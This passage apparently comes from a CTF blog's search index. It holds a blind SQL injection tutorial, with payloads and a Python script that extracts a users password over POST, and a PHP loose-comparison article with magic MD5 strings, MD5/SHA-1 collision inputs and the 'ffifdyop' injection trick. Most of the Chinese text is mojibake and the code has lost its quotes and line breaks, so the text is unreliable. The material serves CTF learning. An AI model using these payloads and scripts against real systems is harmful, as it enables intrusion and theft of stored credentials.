startï¼šå¿…é€‰ã€‚æ­£æ•°ï¼Œä»å­—ç¬¦ä¸²æŒ‡å®šä½ç½®å¼€å§‹æˆªå–ï¼›è´Ÿæ•°ï¼Œä»å­—ç¬¦ä¸²ç»“å°¾æŒ‡å®šä½ç½®å¼€å§‹ æˆªå–ï¼›0ï¼Œåœ¨å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªä½ç½®å¼€å§‹æˆªå–ã€‚ lengthï¼šå¯é€‰ï¼Œéœ€è¦æˆªå–çš„é•¿åº¦ã€‚ç¼ºçœã€‚å³æˆªå–åˆ°ç»“æŸä½ç½® 2.ascii()å‡½æ•° â€‹\tascii()å‡½æ•°ï¼šè¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦è¾¹çš„æ•°å€¼ã€‚ ascii(str) #è¯­æ³• 3.length() å‡½æ•° â€‹\tlength() å‡½æ•°ï¼Œè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ length(str) #è¯­æ³• 4.left() å‡½æ•° â€‹\tleft() å‡½æ•°ï¼Œè¿”å›ä»å·¦è‡³å³æˆªå–å›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸² left(str,n) #è¯­æ³• æˆªå–å­—ç¬¦ä¸²strçš„ä»å·¦è‡³å³å‰nä¸ªå­—ç¬¦ æ³¨å…¥æµç¨‹ æ±‚å½“å‰æ•°æ®åº“é•¿åº¦ æ±‚å½“å‰æ•°æ®åº“è¡¨çš„ASCII (å³çˆ†å‡ºæ•°æ®åº“å) æ±‚å½“å‰æ•°æ®åº“ä¸­è¡¨çš„ä¸ªæ•° æ±‚å½“å‰æ•°æ®åº“ä¸­å…¶ä¸­ä¸€ä¸ªè¡¨åçš„é•¿åº¦ æ±‚å½“å‰æ•°æ®åº“ä¸­å…¶ä¸­ä¸€ä¸ªè¡¨åçš„ASCII æ±‚åˆ—åçš„æ•°é‡ æ±‚åˆ—åçš„é•¿åº¦ æ±‚åˆ—åçš„ASCII æ±‚å­—æ®µçš„æ•°é‡ æ±‚å­—æ®µå†…å®¹çš„é•¿åº¦ æ±‚å­—æ®µå†…å®¹å¯¹åº”çš„ASCII æ‰‹å·¥æ³¨å…¥è¿‡ç¨‹è¯¦è§£ åŸºæœ¬æ¨¡æ¿ ?id=1 and (é•¿åº¦/å­—ç¬¦å‡½æ•°(æ‰€çˆ†æ•°æ®çš„SQL) = n) --+ ä¾‹å¦‚ï¼š ?id=1 and ASCII(SUBSTR((select table_name FROM information_schema.tables where table_schema = database() LIMIT 0,1),1,1)) = 101 # ä»¥çˆ†æ•°æ®åº“åå­—ä¸ºä¾‹ æ±‚é•¿åº¦ ?id=1 and (length(database()) = n) --+ é€šè¿‡é¡µé¢çš„å›æ˜¾è¿›è¡Œåˆ¤æ–­ï¼Œæ•°æ®åº“çš„é•¿åº¦æ˜¯å¤šå°‘ æ±‚æ•°æ®åº“åç§° ä½¿ç”¨left å‡½æ•° -- ä»å·¦è‡³å³æˆªå–ä¸€ä¸ªå­—ç¬¦SELECT * from users WHERE id = 1 and (left(database(),1)=*)-- ä»å·¦åªæœ‰æˆªå–ä¸¤ä¸ªå­—ç¬¦SELECT * from users WHERE id = 1 and (left(database(),2)=**)-- ä»å·¦åªæœ‰æˆªå–nä¸ªå­—ç¬¦SELECT * from users WHERE id = 1 and (left(database(),n)=*****) ä¸æ–­ä¿®æ”¹*ä¸­çš„å­—ç¬¦ï¼Œä½¿ä¹‹é¡µé¢æ˜¾ç¤ºä¸ºtrueçš„ç±»ä¼¼é¡¹ï¼ˆå¦‚ç™»å½•æˆåŠŸã€æˆåŠŸç­‰ï¼‰ ä½¿ç”¨SUBSTRå‡½æ•° -- æˆªå–ç¬¬1ä¸ªå­—ç¬¦SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = ***)-- æˆªå–ç¬¬2ä¸ªå­—ç¬¦SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = ***)-- æˆªå–ç¬¬nä¸ªå­—ç¬¦SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),n,1)) = ***) ä¸æ–­ä¿®æ”¹*ä¸­çš„ASCIIç ï¼Œä½¿ä¹‹é¡µé¢æ˜¾ç¤ºä¸ºtrueçš„ç±»ä¼¼é¡¹ï¼ˆå¦‚ç™»å½•æˆåŠŸã€æˆåŠŸç­‰ï¼‰ æ³¨å…¥è„šæœ¬æ³¨æ„æŸ¥çœ‹è¡¨å•çš„æäº¤å˜é‡åç§° ä½¿ç”¨POSTæäº¤æ•°æ® import requestschars = R0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@%/^!~result = def get_length(value): # è·å–è¦æŸ¥è¯¢çš„æ•°æ®çš„é•¿åº¦ for n in range(1, 100): payload = admin and length((0)) =1 #.format(data_payload, n) data = username: payload, password: admin //æ³¨æ„æŸ¥çœ‹è¡¨å•çš„æäº¤å˜é‡åç§° html = requests.post(url, data=data) length = len(html.text) if length value: print(â€¦â€¦data length is : + str(n)) return ndef get_data(data_length, value): # è·å–æ•°æ® global result for i in range(1, data_length): for char in chars: payload = adminand ascii(substr((0),1,1))=2 #.format(data_payload, i, ord(char)) data = username: payload, password: admin //æ³¨æ„æŸ¥çœ‹è¡¨å•çš„æäº¤å˜é‡åç§° html = requests.post(url, data=data) length = len(html.text) if length value: # æ ¹æ®è¿”å›é•¿åº¦çš„ä¸åŒæ¥åˆ¤æ–­å­—ç¬¦æ­£ç¡®ä¸å¦ result += char print(â€¦â€¦ data is : + result) breakurl = http://***.***.10.67:2081/hard.phpdata_payload = select password from users limit 0,1 //æ‰€çˆ†æ•°æ®çš„sqlè¯­å¥value = 550 # æ ¹æ®æ­£ç¡®è®¿é—®å’Œé”™è¯¯è®¿é—®æ—¶è¿”å›é¡µé¢æ–‡æœ¬é•¿åº¦çš„ä¸åŒ æ¥è®¾ç½®ä¸€ä¸ªåˆ¤æ–­å€¼ï¼Œè¿™ä¸ªå€¼éœ€è¦åœ¨æµè§ˆå™¨ä¸­ æŒ‰f12 æŸ¥çœ‹length = get_length(value) +1get_data(length, value)print(result)","tags":["CTF-Web","Web-SQL"],"categories":["web"]},{"title":"PHPç‰¹æ€§","path":"/posts/44659fec/","content":"PHPPHPä¸­çš„æ¯”è¾ƒç¬¦phpæ˜¯ä¸€ç§å¼±ç±»å‹è¯­è¨€ï¼Œå¯¹æ•°æ®çš„ç±»å‹è¦æ±‚å¹¶ä¸ä¸¥æ ¼ï¼Œå¯ä»¥è®©æ•°æ®ç±»å‹äº’ç›¸è½¬æ¢ã€‚ åœ¨phpä¸­æœ‰ä¸¤ç§æ¯”è¾ƒç¬¦å·: ä¸€ç§æ˜¯ å¼±ç­‰äºï¼Œå¦å¤–ä¸€ç§æ˜¯ å¼ºç­‰äºï¼Œéƒ½æ˜¯ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªæ•°å€¼æ˜¯å¦ç›¸ç­‰çš„æ“ä½œç¬¦ï¼Œä½†ä»–ä»¬ä¹Ÿæ˜¯æœ‰åŒºåˆ«çš„: å¼±ç­‰äº åœ¨æ¯”è¾ƒå‰ä¼šå…ˆæŠŠä¸¤ç§å­—ç¬¦ä¸²ç±»å‹è½¬æˆç›¸åŒçš„å†è¿›è¡Œæ¯”è¾ƒã€‚ç®€å•çš„è¯´ï¼Œå®ƒä¸ä¼šæ¯”è¾ƒå˜é‡ç±»å‹ï¼Œåªæ¯”è¾ƒå€¼ã€‚ ==ï¼šç­‰äºæ¯”è¾ƒç¬¦å·ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œä¸è€ƒè™‘æ•°æ®ç±»å‹ã€‚ != æˆ– ï¼šä¸ç­‰äºæ¯”è¾ƒç¬¦å·ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ä¸ç›¸ç­‰ï¼Œä¸è€ƒè™‘æ•°æ®ç±»å‹ã€‚ ï¼šå°äºæ¯”è¾ƒç¬¦å·ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼çš„å¤§å°ï¼Œå¦‚æœå·¦ä¾§çš„å€¼å°äºå³ä¾§çš„å€¼ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚ ï¼šå¤§äºæ¯”è¾ƒç¬¦å·ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼çš„å¤§å°ï¼Œå¦‚æœå·¦ä¾§çš„å€¼å¤§äºå³ä¾§çš„å€¼ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚ =ï¼šå°äºç­‰äºæ¯”è¾ƒç¬¦å·ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼çš„å¤§å°ï¼Œå¦‚æœå·¦ä¾§çš„å€¼å°äºæˆ–ç­‰äºå³ä¾§çš„å€¼ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚ =ï¼šå¤§äºç­‰äºæ¯”è¾ƒç¬¦å·ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼çš„å¤§å°ï¼Œå¦‚æœå·¦ä¾§çš„å€¼å¤§äºæˆ–ç­‰äºå³ä¾§çš„å€¼ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚ å¼ºç­‰äº åœ¨æ¯”è¾ƒå‰ä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²ç±»å‹æ˜¯å¦ç›¸åŒå†è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç±»å‹ä¸åŒç›´æ¥è¿”å›ä¸ç›¸ç­‰ã€‚æ—¢æ¯”è¾ƒå€¼ä¹Ÿæ¯”è¾ƒç±»å‹ã€‚ ===ï¼šå…¨ç­‰æ¯”è¾ƒç¬¦å·ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œå¹¶ä¸”æ•°æ®ç±»å‹ä¹Ÿç›¸åŒã€‚ !==ï¼šä¸å…¨ç­‰æ¯”è¾ƒç¬¦å·ã€‚ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ä¸ç›¸ç­‰ï¼Œæˆ–è€…æ•°æ®ç±»å‹ä¸ç›¸åŒã€‚ å¼±ç­‰äºè½¬åŒ–è§„åˆ™è§„åˆ™1.è‹¥ä¸€ä¸ªæ•°å­—å’Œä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæˆ–è€…è¿›è¡Œè¿ç®—æ—¶ï¼ŒPHPä¼šæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—å†è¿›è¡Œæ¯”è¾ƒã€‚å½“å­—ç¬¦ä¸²è¢«å½“ä½œä¸€ä¸ªæ•°å€¼æ¥å¤„ç†æ—¶ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«â€™.â€™,â€˜eâ€™,â€™Eâ€™å¹¶ä¸”å…¶æ•°å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…ï¼Œè¯¥å­—ç¬¦ä¸²ä½œä¸ºintæ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²å¼€å§‹éƒ¨åˆ†å†³å®šå®ƒçš„å–å€¼ï¼Œå¼€å§‹éƒ¨åˆ†ä¸ºæ•°å­—ï¼ˆæœ€å¼€å¤´çš„éƒ¨åˆ†ï¼‰ï¼Œåˆ™å…¶å€¼å°±æ˜¯å¼€å§‹çš„æ•°å­—ï¼Œå¦åˆ™ï¼ˆåŒ…æ‹¬åé¢å‡ºç°æ•°å­—çš„æƒ…å†µï¼‰ï¼Œå…¶å€¼ä¸º0ã€‚ä¾‹å¦‚: 12==12 // true12==12aa //trueadmin==0 //truefalse == == 0 == NULL //true 2.å¸ƒå°”å€¼trueå’Œä»»æ„å­—ç¬¦ä¸²éƒ½å¼±ç›¸ç­‰ã€‚ä¾‹å¦‚: true==wells //true 3.æ•°å­—å’Œâ€œeâ€å¼€å¤´åŠ ä¸Šæ•°å­—çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚â€1e123â€ï¼‰ä¼šå½“ä½œç§‘å­¦è®¡æ•°æ³•å»æ¯”è¾ƒï¼›\t0eåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å…¶è§†ä½œä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥æ— è®º0eåé¢æ˜¯ä»€ä¹ˆï¼Œ0çš„å¤šå°‘æ¬¡æ–¹è¿˜æ˜¯0ï¼› ç»•è¿‡MD5éªŒè¯å¼±ç±»å‹æ¯”è¾ƒ0eç»•è¿‡åŸç†ï¼šè‹¥ä½¿ç”¨PHPçš„å¼±æ¯”è¾ƒæ—¶ï¼Œ0eå¼€å¤´çš„å­—ç¬¦ä¸²åœ¨å‚ä¸æ¯”è¾ƒæ—¶,ä¼šè¢«å½“åšç§‘å­¦è®¡æ•°æ³•,ç»“æœè½¬æ¢ä¸º0 ä¾‹ï¼š md5(QNKCDZO) == md5(240610708) MD5åŠ å¯†åå¾—åˆ° 0e830400451993494058024219903391 == 0e462097431906509019562988736854 //å³0==0ï¼Œä¸ºtrue å¸¸ç”¨MD5åŠ å¯†åä¸º0eçš„å­—ç¬¦ä¸²QNKCDZObyGcYsonZ7yaabg7XSsaabC9RqSs878926199as155964671as214587387as1091221200a å¼ºç±»å‹æ¯”è¾ƒæ•°ç»„ç»•è¿‡åŸç†ï¼šMD5æ— æ³•åŠ å¯†æ•°ç»„ï¼Œä½¿ç”¨æ•°ç»„è™½ç„¶ä¼šæŠ¥é”™ï¼Œè¿”å›äº†nullï¼Œnullnull ä½¿ç”¨æ–¹æ³• a[]=ab[]=b å¼ºç±»å‹ç»•è¿‡ï¼ˆMD5ç¢°æ’ï¼‰åŸç†ï¼šä½¿ç”¨ä¸¤ä¸ªæ•°å€¼ä¸åŒä½†MD5å€¼ç›¸åŒçš„å­—ç¬¦ä¸²ï¼ˆä»¥ä¸‹å­—ç¬¦ä¸²ç»è¿‡URLç¼–ç ï¼‰ --------------------c=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 d=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2--------------------param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2------------------- Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2-------------------- --------------------$s1 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab$s2 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab$s3 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab-------------------- æ‹“:sha1åŠ å¯†çš„ä¸¤ä¸ªç›¸åŒå€¼array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 MD5-SQLæ³¨å…¥é¢˜ç›®ç±»ä¼¼äº ?phpsql=select * from admin where password=.md5($pass,true).;? ä¸€ä¸ªtickerï¼šå­—ç¬¦ä¸²ï¼šffifdyopçš„mdå€¼ä¸º or6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\u001c æ‹¼å‡‘åˆ°sqlè¯­å¥ä¸­å˜æˆäº† select * from admin where password=or6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\u001c ç”±äºéç©ºå­—ç¬¦ä¸²è®¤ä¸ºçœŸï¼Œæ‰€æœ‰å®ç°äº†sqlæ³¨å…¥ å®æˆ˜1.æ”»é˜²ä¸–ç•Œ-simple_php?phpshow_source(__FILE__);include(config.php);$a=@$_GET[a];$b=@$_GET[b];if($a==0 and $a) echo $flag1;if(is_numeric($b)) exit();if($b1234) echo $flag2;? æ­¤å¤„ä½¿ç”¨ä»»æ„å¼€å¤´ä¸å«æ•°å­—çš„å­—ç¬¦ä¸²å¯ä½¿açš„ç›¸å…³æ¡ä»¶é€šè¿‡ã€‚ ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼šç”±äºaæ˜¯å¼±æ¯”è¾ƒï¼Œæ­¤æ—¶ä»»æ„å¼€å¤´ä¸å«æ•°å­—çš„å­—ç¬¦ä¸²è¢«å½“æˆ0è¿›è¡Œæ¯”ä»· ç¬¬äºŒä¸ªæ¡ä»¶ï¼šaä¸ä¸ºç©ºï¼ˆéç©ºå­—ç¬¦ä¸²ï¼‰ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸã€‚å¦‚æœa æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œæ¡ä»¶å°†ä¸ºå‡ã€‚ æ­¤å¤„ä½¿ç”¨å¼€å¤´å«æ•°å­—ä¸”æ•°å­—å¤§äº1234çš„å­—ç¬¦ä¸²å¯ä½¿bçš„ç›¸å…³æ¡ä»¶é€šè¿‡ã€‚ ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼šè¦æ±‚bä¸èƒ½æ˜¯ä¸€ä¸ªæ•°å­—æˆ–è€…æ˜¯å…¨ç”±æ•°å­—æ„æˆçš„å­—ç¬¦ä¸² ç¬¬äºŒä¸ªæ¡ä»¶ï¼šæ­¤æ—¶è¿›è¡Œè‹¥æ¯”è¾ƒï¼Œå¼€å¤´å«æ•°å­—ä¸”æ•°å­—å¤§äº1234çš„å­—ç¬¦ä¸²ä¼šè¢«ä½œä¸ºæ•°å­—è¿›è¡Œæ¯”è¾ƒ","tags":["CTF-Web","Web-PHP"],"categories":["web"]},{"title":"å…³äº","path":"/about/index.html","content":"About Me Hiï¼ŒI'm Wells. CTFer ç½‘ç»œå®‰å…¨å°ç™½ æ‡’ä¸”å®… å–œæ¬¢æ¢ç´¢æ–°çŸ¥è¯†æ–°é¢†åŸŸ çƒ­è¡·äºå°†é—®é¢˜åˆ¨æ ¹é—®åº•åœ°ç ”ç©¶ä¸‹å» ç»å¸¸ä¸‰åˆ†é’Ÿçƒ­åº¦åœ°å¼€ä¸€ç¯‡æ–°æ–‡ç« ï¼Œä½†å†™ç€å†™ç€å°±å’•å’•å“’äº† åŠ±å¿—æˆä¸ºç³•æ‰‹ï¼ŒæœŸå¾…å’Œå„ä½å¸ˆå‚…å…±åŒè¿›æ­¥ About Blog æœ¬ç«™ä½¿ç”¨ Hexoæ¡†æ¶ ä¸ Stellar ä¸»é¢˜åˆ›å»ºï¼Œä½¿ç”¨ Github action è‡ªåŠ¨åŒ–æ„å»ºå’Œ Github Pages æ‰˜ç®¡ã€‚ æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ CC BY-NC-SA 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"},{"title":"å‹é“¾","path":"/friends/index.html","content":"å¤§ä½¬ä»¬ å¦‚ä½•äº¤æ¢å‹é“¾ æ–°å»º GitHub Issue æŒ‰ç…§æ¨¡æ¿æ ¼å¼å¡«å†™å¹¶æäº¤ æ›´æ–°å‹é“¾ä¿¡æ¯ å¦‚æœæ‚¨éœ€è¦æ›´æ–°è‡ªå·±çš„å‹é“¾ä¿¡æ¯ï¼Œè¯·ç›´æ¥ä¿®æ”¹ GitHub Issue å†…å®¹ , ä¿®æ”¹å®Œæˆåå°†ä¼šåœ¨ä¸‰åˆ†é’Ÿå†…è‡ªåŠ¨å®Œæˆæ›´æ–°ã€‚å¦‚æœæ— æ³•ä¿®æ”¹ï¼Œå¯ä»¥åœ¨æ­¤é¡µé¢ç•™è¨€ã€‚"}]